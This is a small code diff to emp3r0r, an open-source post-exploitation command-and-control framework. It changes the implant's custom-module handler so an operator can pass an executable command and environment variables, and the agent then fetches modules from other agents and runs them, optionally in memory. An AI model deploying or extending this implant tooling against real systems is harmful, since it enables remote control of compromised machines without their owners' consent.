@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"strconv"
+	"strings"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -246,20 +247,22 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !custom_module --mod_name mod_name --checksum checksum
-	// Usage: !custom_module --mod_name <module_name> --checksum <checksum> --in_mem <in_memory>
+	// Usage: !custom_module --mod_name <module_name> --exec <executable file> --env "VAR1=1,VAR2=2" --checksum <checksum> --in_mem <in_memory>
 	// Loads a custom module with the specified name and checksum.
 	case emp3r0r_data.C2CmdCustomModule:
 		modName := flags.StringP("mod_name", "m", "", "Module name")
+		exec_cmd := flags.StringP("exec", "x", "", "Run this command to start the module")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
-		startscript_checksum := flags.StringP("startscript_checksum", "s", "", "Start script checksum")
+		env := flags.StringP("env", "e", "", "Set these environment variables")
 		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
 		flags.Parse(cmdSlice[1:])
 		if *modName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = moduleHandler(*download_addr, *modName, *checksum, *startscript_checksum, *inMem)
+		envParsed := strings.Split(*env, ",")
+		out = moduleHandler(*download_addr, *modName, *checksum, *exec_cmd, envParsed, *inMem)
 		return
 
 	// !upgrade_agent --checksum checksum
